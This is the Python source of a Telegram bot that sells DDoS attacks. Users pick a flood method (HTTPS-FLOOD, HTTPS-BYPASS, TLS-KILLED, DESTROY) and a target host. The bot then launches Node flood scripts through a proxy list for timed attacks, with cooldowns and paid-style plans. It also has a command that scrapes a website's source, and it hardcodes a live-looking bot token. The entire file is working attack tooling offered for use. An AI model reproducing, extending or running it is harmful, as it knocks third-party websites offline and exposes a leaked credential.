import telebot
import datetime
import time
import os
import subprocess
import psutil
import sqlite3
import hashlib
import requests
import sys
import socket
import zipfile
import io
import re
import threading

bot_token = '7103785357:AAE9Wq5BahCNnsRr7e0YxpDgNglddyApQgo'

bot = telebot.TeleBot(bot_token)

proxy_update_count = 0
last_proxy_update_time = time.time()

connection = sqlite3.connect('user_data.db')
cursor = connection.cursor()

# Create the users table if it doesn't exist
cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        expiration_time TEXT
    )
''')
connection.commit()
def TimeStamp():
    now = str(datetime.date.today())
    return now
def load_users_from_database():
    cursor.execute('SELECT user_id, expiration_time FROM users')
    rows = cursor.fetchall()
    for row in rows:
        user_id = row[0]
        expiration_time = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
        if expiration_time > datetime.datetime.now():
            allowed_users.append(user_id)

def save_user_to_database(connection, user_id, expiration_time):
    cursor = connection.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO users (user_id, expiration_time)
        VALUES (?, ?)
    ''', (user_id, expiration_time.strftime('%Y-%m-%d %H:%M:%S')))
    connection.commit()
    
@bot.message_handler(commands=['start', 'help'])
def help(message):
    help_text = '''
BOT DDOS BY DUY 
NhậP Lệnh Để Khởi Chạy Bot
 - /methods : Phương Pháp Tấn Công Máy Chủ
 - /plan : Power Bot DDOS Của Bạn
 - /admin : Admin Bot 
 - /code + Target : Lấy Source Website
'''
    bot.reply_to(message, help_text)
    

@bot.message_handler(commands=['methods'])
def methods(message):
    help_text = '''
HTTPS-FLOOD : Vip
HTTPS-BYPASS : Basic
TLS-KILLED : True
DESTROY : Vip
Tấn công vui lòng nhập lệnh 
" /attack + Phương Pháp + Host "
'''
    bot.reply_to(message, help_text)


@bot.message_handler(commands=['admin'])
def methods(message):
    help_text = '''
Admin : Duy
Owner : Haibedeveloper
/ Power By : Alpha Network
'''
    bot.reply_to(message, help_text)


@bot.message_handler(commands=['plan'])
def methods(message):
    help_text = '''
-----------------------------------------------------
Cool Down : 90sec
Plan : Basic
Attack Max Seconds : 90s
-----------------------------------------------------
Total / Days : 120
Welcome Alpha Power
-----------------------------------------------------
'''
    bot.reply_to(message, help_text)


@bot.message_handler(commands=['code'])
def code(message):
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'The bot is now off. Please wait for when it will be turned back on.')
        return
    
    if len(message.text.split()) != 2:
        bot.reply_to(message, 'Please enter the correct syntax.nFor example: /code + [website link]')
        return

    url = message.text.split()[1]

    try:
        response = requests.get(url)
        if response.status_code != 200:
            bot.reply_to(message, 'The source code cannot be obtained from this website. Please check the URL again.')
            return

        content_type = response.headers.get('content-type', '').split(';')[0]
        if content_type not in ['text/html', 'application/x-php', 'text/plain']:
            bot.reply_to(message, 'The website is not HTML or PHP. Please try with the website URL that contains HTML or PHP files.')
            return

        source_code = response.text

        zip_file = io.BytesIO()
        with zipfile.ZipFile(zip_file, 'w') as zipf:
            zipf.writestr("source_code.txt", source_code)

        zip_file.seek(0)
        bot.send_chat_action(message.chat.id, 'upload_document')
        bot.send_document(message.chat.id, zip_file)

    except Exception as e:
        bot.reply_to(message, f'C {str(e)}')

allowed_users = []  # Define your allowed users list
cooldown_dict = {}
is_bot_active = True

def run_attack(command, duration, message):
    cmd_process = subprocess.Popen(command)
    start_time = time.time()
    
    while cmd_process.poll() is None:
        # Check CPU usage and terminate if it's too high for 10 seconds
        if psutil.cpu_percent(interval=1) >= 1:
            time_passed = time.time() - start_time
            if time_passed >= 90:
                cmd_process.terminate()
                bot.reply_to(message, "Attack Order Stopped. Thank You For Using.")
                return
        # Check if the attack duration has been reached
        if time.time() - start_time >= duration:
            cmd_process.terminate()
            cmd_process.wait()
            return

@bot.message_handler(commands=['attack'])
def attack_command(message):

    if len(message.text.split()) < 3:
        bot.reply_to(message, 'Please Enter Correct Syntax.\Example: /attack + [method] + [host]')
        return

    username = message.from_user.username

    current_time = time.time()
    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 150:
        remaining_time = int(150 - (current_time - cooldown_dict[username].get('attack', 0)))
        bot.reply_to(message, f"@{username} Please Wait {remaining_time} Seconds Before Using the Command Again.")
        return
    
    args = message.text.split()
    method = args[1].upper()
    host = args[2]

    blocked_domains = ["chinhphu.vn", "ngocphong.com"]   
    if method == 'TLS-FLOODER' or method == 'TLS-BYPASS':
        for blocked_domain in blocked_domains:
            if blocked_domain in host:
                bot.reply_to(message, f"Attacking Websites with Domain Names is Not Allowed {blocked_domain}")
                return

    if method in ['HTTPS-FLOOD', 'HTTPS-BYPASS', 'TLS-KILLED', 'DESTROY']:
        # Update the command and duration based on the selected method
        if method == 'HTTPS-FLOOD':
            command = ["node", "HTTPS-FLOOD.js", host, "90", "75", "10", "proxy.txt"]
            duration = 90
        if method == 'HTTPS-BYPASS':
            command = ["node", "HTTPS-BYPASS.js", host, "90", "90", "10", "GET", "proxy.txt"]
            duration = 90
        if method == 'TLS-KILLED':
            command = ["node", "TLS-KILLED.js", host, "90", "90", "10", "proxy.txt"]
            duration = 90
        if method == 'DESTROY':
            command = ["node", "DESTROY.js", host, "90", "90", "10", "proxy.txt"]
            duration = 90

        cooldown_dict[username] = {'attack': current_time}

        attack_thread = threading.Thread(target=run_attack, args=(command, duration, message))
        attack_thread.start()
        bot.reply_to(message, f'Attack SucessFully Sent \n • Attack By : @{username} \n • Host : {host} \n • Port : 443 \n • Methods : {method} \n • Time : {duration} Seconds')
    else:
        bot.reply_to(message, 'Invalid Attack Method.')

@bot.message_handler(func=lambda message: message.text.startswith('/'))
def invalid_command(message):
    bot.reply_to(message, 'Invalid Order. Please Use /help Command To View Command List.')

bot.infinity_polling(timeout=60, long_polling_timeout = 1)
